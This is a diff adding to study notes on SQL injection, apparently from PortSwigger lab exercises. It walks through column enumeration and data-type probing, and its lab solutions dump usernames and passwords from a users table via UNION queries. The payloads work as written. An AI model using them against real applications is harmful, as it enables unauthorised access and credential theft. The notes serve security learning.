@@ -71,9 +71,45 @@ We find out somehow that user admin123 exists and we append union to it.
 
 ```sql
 admin123' UNION SELECT 1;--
+-- or
+admin123' ORDER BY 1--
+-- or
+admin123' UNION SELECT NULL--
 ```
 
 And we keep adding 1,2,3 to select statement until we get a true (boolean) response confirming the validity of our sql query.
+
+**LAB** - find number of cols in the table.
+**Solution** - `/filter?category=Accessories' UNION SELECT NULL,NULL,NULL--` 
+
+*SQL cheatsheet*
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+Because every database language is slightly different and has it's requirements for syntax here is the cheat-sheet to help.
+
+#### Finding columns with useful data types
+
+```sql
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+By this enumeration, pay attention to errors or if data is returned or not to validate if a given column contains data of type string ('a').
+This is a scenario where we concluded that the table has 4 columns, and payloads length is adjusted accordingly.
+
+**LAB** - dump login creds, there is a table `users` and it contains cols `username & password`.
+**Solution** - `/filter?category=Gifts' UNION SELECT username,password FROM users--`
+
+*Tip:* Concatenate multiple values in a single column.
+```sql
+' UNION SELECT username || '~' || password FROM users--
+```
+
+**LAB** - dump login creds, multiple values in a single column.
+**Solution** - `/filter?category=Pets' UNION SELECT NULL,username || '~' || password FROM users--`
+We first needed to enumerate the columns data types, we found 2 cols and second one is a string.
+And we use that string col to exfiltrate username and password from users table by concatenating the two and exfiltrating it via selected string.
+
 
 Now we can start enumeration process.
 Utilizing database() function, like operator, and '%' which is just a wildcard such as * is in shell.
